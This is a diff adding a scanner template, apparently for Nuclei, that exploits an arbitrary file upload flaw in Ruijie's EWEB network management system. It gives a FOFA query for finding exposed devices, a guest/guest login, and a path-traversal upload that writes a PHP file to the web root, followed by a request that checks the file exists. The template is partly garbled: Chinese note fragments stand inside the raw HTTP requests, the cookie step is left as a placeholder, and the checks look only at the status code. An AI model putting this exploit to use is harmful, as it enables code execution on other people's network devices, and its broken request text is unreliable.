@@ -1,0 +1,81 @@
+id: poc-udrvwo3bzkl823yg
+info:
+  name: 锐捷uploadAction存在任意文件文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/udrvwo3bzkl823yg'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: udrvwo3bzkl823yg
+    fofa: title=”锐捷网络-EWEB网管系统"
+http:
+- raw:
+  - 'POST /ddi/server/login.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0
+
+    Content-Length: 30
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: keep-alive
+
+
+    username=guest&password=guest?
+
+
+    构造上传'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /system_pi/timeout.php?a=upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Content-Length: 62
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie:填入步骤一获取的cookie
+
+    X-Requested-With: XMLHttpRequest
+
+    Connection: keep-alive
+
+    fileName=../tmp/html/test.php&mes=<?php echo 123321;?>
+
+
+
+    文件定位：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - GET /test.php HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
